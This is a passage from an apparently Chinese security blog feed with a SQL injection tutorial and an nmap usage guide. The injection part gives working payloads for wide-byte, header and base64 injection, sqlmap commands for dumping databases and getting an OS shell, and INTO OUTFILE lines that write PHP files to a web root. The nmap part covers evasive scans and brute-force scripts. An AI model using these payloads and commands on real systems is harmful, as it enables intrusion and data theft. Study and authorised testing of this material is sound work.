  &lt;li&gt;就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；&lt;/li&gt;
  &lt;li&gt;跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；&lt;/li&gt;
  &lt;li&gt;后面就是union注入攻击的常规操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;宽字节注入攻击&quot;&gt;宽字节注入攻击&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；&lt;/li&gt;
  &lt;li&gt;一般情况下，此处就不存在sql注入漏洞的；&lt;/li&gt;
  &lt;li&gt;但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；&lt;/li&gt;
  &lt;li&gt;宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；&lt;/li&gt;
  &lt;li&gt;因此构造闭合规则时，在单引号前面加上 %df 就行了；&lt;/li&gt;
  &lt;li&gt;之后在闭合规则中写入同union注入的一些查询语句就行了；&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;base64注入攻击&quot;&gt;base64注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；&lt;/li&gt;
  &lt;li&gt;那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；&lt;/li&gt;
  &lt;li&gt;注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-cookie注入攻击&quot;&gt;HTTP请求头参数注入-cookie注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;常见的http头部注入的参数有：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;和union注入的差别就在于注入点不一样，之后使用union注入的方法即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;http请求头参数注入-xff注入攻击&quot;&gt;HTTP请求头参数注入-XFF注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;例如测试此参数的值 X-Forwarded-for:127.0.0.1’ 响应有sql报错，那么此处就是注入点；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;之后使用union注入的方法完成即可&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;知道绝对路径的注入&quot;&gt;知道绝对路径的注入&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;如果通过一些方式爆出了网站的根目录，并且知道此站点存在sql注入；&lt;/li&gt;
  &lt;li&gt;猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用菜刀连接；&lt;/li&gt;
  &lt;li&gt;如果数据库没有file权限，那么我们用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；&lt;/li&gt;
  &lt;li&gt;如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；&lt;/li&gt;
  &lt;li&gt;如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;sqlmap&quot;&gt;SQLMAP&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;官网:http://sqlmap.org/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ~ sqlmap -h 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST
    --cookie=COOKIE     HTTP Cookie header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;检查注入点&quot;&gt;检查注入点&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆所有数据库信息&quot;&gt;爆所有数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --dbs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;爆当前数据库信息&quot;&gt;爆当前数据库信息&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL --current-db
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名列出所有表&quot;&gt;指定库名列出所有表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 --tables
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名列出所有字段&quot;&gt;指定库名表名列出所有字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 --columns
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定库名表名字段dump出指定字段&quot;&gt;指定库名表名字段dump出指定字段&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 -C 字段...--dump
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;sql注入写webshell&quot;&gt;SQL注入写WebShell&lt;/h1&gt;

&lt;h2 id=&quot;sql写webshell条件&quot;&gt;SQL写WebShell条件&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;在&lt;a href=&quot;https://www.uedbox.com/post/tag/mysql/&quot;&gt;mysql&lt;/a&gt;的配置文件 my.ini 中，&lt;code&gt;secure_file_priv=&quot;c:/wamp64/tmp&quot;&lt;/code&gt; 被注释 或者 ``secure_file_priv` 配置的位置是web目录。&lt;/li&gt;
  &lt;li&gt;未开启全局gpc&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sql注入点写webshell的5种方式&quot;&gt;SQL注入点写WebShell的5种方式&lt;/h2&gt;

&lt;h3 id=&quot;union-select-后写入&quot;&gt;union select 后写入&lt;/h3&gt;

&lt;p&gt;最常见的写入方式，union select 后跟 into outfile 语句&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into outfile 'path/webshell.php'
urlid=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into dumpfile 'path/webshell.php'
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;lines-terminated-by-写入&quot;&gt;lines terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
url?id=1 limit 1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;通过select语句查询的内容写入文件，也就是 &lt;code&gt;1 into outfile 'path/webshell.php'&lt;/code&gt; 这样写的原因，然后利用 &lt;code&gt;lines terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行终止的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;lines-starting-by-写入&quot;&gt;lines starting by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
url?id=1 limit 1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理-1&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;利用 &lt;code&gt;lines starting by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines starting by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行开始的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&quot;fields-terminated-by-写入&quot;&gt;fields terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
url?id=1 limit 1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;columns-terminated-by-写入&quot;&gt;COLUMNS terminated by 写入&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
url?id=1 limit 1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;注入原理-2&quot;&gt;注入原理&lt;/h4&gt;

&lt;p&gt;利用 &lt;code&gt;fields terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;fields terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每个字段的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">nmap</title><link href="http://localhost:4000/_posts/2020-07-12-nmap/" rel="alternate" type="text/html" title="nmap" /><published>2020-07-12T00:00:00-04:00</published><updated>2020-07-12T00:00:00-04:00</updated><id>http://localhost:4000/_posts/nmap</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-12-nmap/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图Nmap的发送特制的数据包到目标主机然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;官网:&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//nmap.org/&quot;&gt;http://nmap.org&lt;/a&gt; 图形化:Zenmap&lt;/p&gt;

&lt;h1 id=&quot;基本操作&quot;&gt;基本操作&lt;/h1&gt;

&lt;h2 id=&quot;基本快速扫描&quot;&gt;基本快速扫描&lt;/h2&gt;

&lt;p&gt;Nmap 默认发送一个&lt;code&gt;arp的ping数据包&lt;/code&gt;来探测目标主机在1-10000范围内所开放的端口。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bashl&quot;&gt;nmap  ip
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;快速扫描多个目标&quot;&gt;快速扫描多个目标&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap  ip1 ip2
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;详细描述输出扫描&quot;&gt;详细描述输出扫描&lt;/h2&gt;

&lt;p&gt;简单扫描并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比 就不会显得那么枯燥而且可以提升逼格。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -vv ip
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;指定端口和范围扫描&quot;&gt;指定端口和范围扫描&lt;/h2&gt;

&lt;p&gt;nmap 默认扫描目标1-10000范围内的端口号。我们则可以通过参数&lt;code&gt;-p&lt;/code&gt; 来设置我们将要扫描的端口号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -p(range) &amp;lt;target IP&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;扫描除过某一个ip外的所有子网主机&quot;&gt;扫描除过某一个ip外的所有子网主机&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.130.1.1/24 -exclude 10.130.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;扫描除过某一个文件中的ip外的子网主机&quot;&gt;扫描除过某一个文件中的ip外的子网主机&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.130.1.1/24 -excludefile gov.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;显示扫描的所有主机的列表&quot;&gt;显示扫描的所有主机的列表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sL 10.130.1.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;sp-ping-扫描&quot;&gt;sP ping 扫描&lt;/h2&gt;

&lt;p&gt;nmap 可以利用类似window/linux 系统下的ping方式进行扫描&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sP &amp;lt;target ip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一般来说 我们会用这个命令去扫描内网的一个ip范围用来做内网的主机发现。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sP 10.130.1.1-255
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PING扫描不同于其它的扫描方式因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限如果用户没有ROOT权限,PING扫描将会使用connect()调用&lt;/p&gt;

&lt;h2 id=&quot;ss-syn半开放扫描&quot;&gt;sS SYN半开放扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap -sS 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描因为这种技术使得Nmap不需要通过完整的握手就能获得远程主机的信息。Nmap发送SYN包到远程主机但是它不会产生任何会话.因此&lt;code&gt;不会在目标主机上产生任何日志记录&lt;/code&gt;,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是&lt;code&gt;Tcp SYN&lt;/code&gt;.但是它需要&lt;code&gt;root/administrator&lt;/code&gt;权限。&lt;/p&gt;

&lt;h2 id=&quot;st-tcp扫描&quot;&gt;sT TCP扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sT 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口。&lt;/p&gt;

&lt;h2 id=&quot;su-udp扫描&quot;&gt;sU UDP扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sU 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机并等待响应,如果返回ICMP不可达的错误消息说明端口是关闭的如果得到正确的适当的回应说明端口是开放的.&lt;/p&gt;

&lt;h2 id=&quot;sf-fin标志的数据包扫描&quot;&gt;sF FIN标志的数据包扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sF 110.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出这个扫描的话 会漏扫许多~FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.&lt;/p&gt;

&lt;h2 id=&quot;sv-version版本检测扫描&quot;&gt;sV Version版本检测扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sV 192.168.1.135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;本检测是用来扫描目标主机和端口上&lt;code&gt;运行的软件的版本&lt;/code&gt;.它不同于其它的扫描技术它不是用来扫描目标主机上开放的端口不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。&lt;/p&gt;

&lt;p&gt;这个扫描的话速度会慢一些&lt;code&gt;67.86&lt;/code&gt;秒扫一个IP。&lt;/p&gt;

&lt;h2 id=&quot;o-os操作系统类型的探测&quot;&gt;O OS操作系统类型的探测&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;远程检测操作系统和软件Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上然后检查结果和数据库对照。&lt;/p&gt;

&lt;h2 id=&quot;osscan-guess-猜测匹配操作系统&quot;&gt;osscan-guess 猜测匹配操作系统&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O --osscan-guess 192.168.1.134
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过Nmap准确的检测到远程操作系统是比较困难的需要使用到Nmap的猜测功能选项,&lt;code&gt;–osscan-guess&lt;/code&gt;猜测认为最接近目标的匹配操作系统类型。&lt;/p&gt;

&lt;h2 id=&quot;pn-no-ping扫描&quot;&gt;PN No ping扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -O -PN 192.168.1.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果远程主机有防火墙IDS和IPS系统你可以使用-PN命令来确保不ping远程主机因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。&lt;/p&gt;

&lt;p&gt;这个扫描整个c段局域网的话还是比较耗时的但是信息收集很详细大概耗时&lt;code&gt;9&lt;/code&gt;分钟。&lt;/p&gt;

&lt;h2 id=&quot;t-设置时间模板&quot;&gt;T 设置时间模板&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sS -T&amp;lt;0-5&amp;gt; 192.168.1.134
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;优化时间控制选项的功能很强大也很有效但有些用户会被迷惑。此外 往往选择合适参数的时间超过了所需优化的扫描时间。因此Nmap提供了一些简单的 方法使用6个时间模板使用时采用-T选项及数字(0 – 5) 或名称。模板名称有&lt;code&gt;paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;paranoid、sneaky模式用于IDS躲避&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Normal为默认模式因此-T3 实际上是未做任何优化。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;网段扫描格式&quot;&gt;网段扫描格式&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sP &amp;lt;network address &amp;gt; &amp;lt;/CIDR &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;解释CIDR 为你设置的子网掩码&lt;code&gt;(/24 , /16 ,/8 等)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;10.1.1.0/24  =  10.1.1.1-10.1.1.255       #c段扫描10.1.1.0/16  =  10.1.1.1-10.1.255.255     #b段扫描10.1.1.0/8   =  10.1.1.1-10.255.255.255   #a段扫描
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;从文件中读取需要扫描的ip列表&quot;&gt;从文件中读取需要扫描的IP列表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -iL ip-address.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;路由跟踪扫描&quot;&gt;路由跟踪扫描&lt;/h2&gt;

&lt;p&gt;路由器追踪功能能够帮网络管理员了解网络通行情况同时也是网络管理人员很好的辅助工具通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点并可以看到通过各个节点所花费的时间&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -traceroute www.baidu.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;a-os识别版本探测脚本扫描和traceroute综合扫描&quot;&gt;A OS识别,版本探测,脚本扫描和traceroute综合扫描&lt;/h2&gt;

&lt;p&gt;此选项设置包含了1-10000的端口ping扫描操作系统扫描脚本扫描路由跟踪服务探测。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -A 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;命令混合式扫描&quot;&gt;命令混合式扫描&lt;/h2&gt;

&lt;p&gt;命令混合扫描可以做到类似参数-A所完成的功能但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;输出格式&quot;&gt;输出格式&lt;/h2&gt;

&lt;p&gt;扫描的结果输出到屏幕,同时会存储一份到grep-output.txt&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;扫描结果输出为html&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;nmap高级用法之脚本使用&quot;&gt;nmap高级用法之脚本使用&lt;/h1&gt;

&lt;h2 id=&quot;按照脚本分类进行扫描&quot;&gt;按照脚本分类进行扫描&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script 类别
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nmap官方脚本文档: &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/&quot;&gt;https://nmap.org/nsedoc/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;nmap脚本分类:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;- auth: 负责处理鉴权证书绕开鉴权的脚本  
- broadcast: 在局域网内探查更多服务开启状况如dhcp/dns/sqlserver等服务  
- brute: 提供暴力破解方式针对常见的应用如http/snmp等  
- default: 使用-sC或-A选项扫描时候默认的脚本提供基本脚本扫描能力  
- discovery: 对网络进行更多的信息如SMB枚举、SNMP查询等  
- dos: 用于进行拒绝服务攻击  
- exploit: 利用已知的漏洞入侵系统  
- external: 利用第三方的数据库或资源例如进行whois解析  
- fuzzer: 模糊测试的脚本发送异常的包到目标机探测出潜在漏洞 
- intrusive: 入侵性的脚本此类脚本可能引发对方的IDS/IPS的记录或屏蔽- malware: 探测目标机是否感染了病毒、开启了后门等信息  
- safe: 此类与intrusive相反属于安全性脚本  
- version: 负责增强服务与版本扫描Version Detection功能的脚本  
- vuln: 负责检查目标机是否有常见的漏洞Vulnerability如是否有MS08_067
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;使用具体脚本进行扫描&quot;&gt;使用具体脚本进行扫描&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script 具体的脚本 www.baidu.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;常用脚本使用案例&lt;/p&gt;

&lt;h4 id=&quot;扫描服务器的常见漏洞&quot;&gt;扫描服务器的常见漏洞&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script vuln &amp;lt;target&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;检查ftp是否开启匿名登陆&quot;&gt;检查FTP是否开启匿名登陆&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script ftp-anon &amp;lt;target&amp;gt;PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner| d--x--x--x   2 root     root         1024 Jan 14  2002 bin| d--x--x--x   2 root     root         1024 Aug 10  1999 etc| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对mysql进行暴破解&quot;&gt;对MySQL进行暴破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script=mysql-brute &amp;lt;target&amp;gt;3306/tcp open  mysql
| mysql-brute:
|   Accounts
|     root:root - Valid credentials
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对mssql进行暴破解&quot;&gt;对MsSQL进行暴破解&lt;/h4&gt;

